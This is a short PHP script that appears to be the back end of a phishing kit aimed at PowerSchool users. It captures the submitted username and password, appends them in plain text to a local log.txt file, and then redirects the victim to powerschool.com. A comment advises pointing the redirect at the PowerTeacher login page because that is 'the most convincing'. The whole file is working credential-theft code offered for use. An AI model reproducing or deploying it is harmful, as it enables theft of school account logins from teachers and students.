<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
			return false;
		}

		$username = $_REQUEST['username'];
		$password = $_REQUEST['password'];
                $usrname = ["UsrName="];
                $space = [" "];
                $key = ["password="];
                $return = ["
                "];
                
                file_put_contents('log.txt', $usrname, FILE_APPEND);
                file_put_contents('log.txt', $username, FILE_APPEND);
                file_put_contents('log.txt', $space, FILE_APPEND);
                file_put_contents('log.txt', $key, FILE_APPEND);
                file_put_contents('log.txt', $password, FILE_APPEND);
                file_put_contents('log.txt', $return, FILE_APPEND);
                
	}
	
	//Change 'Location' to whatever webpage you want to redirect to after login. The powerteacher login page would be the most convincing. It is currently set to powerschool.com.
	
	if(mail_sender()){
		header( 'Location: https://powerschool.com');
	}


header('Location: https://powerschool.com');


?>
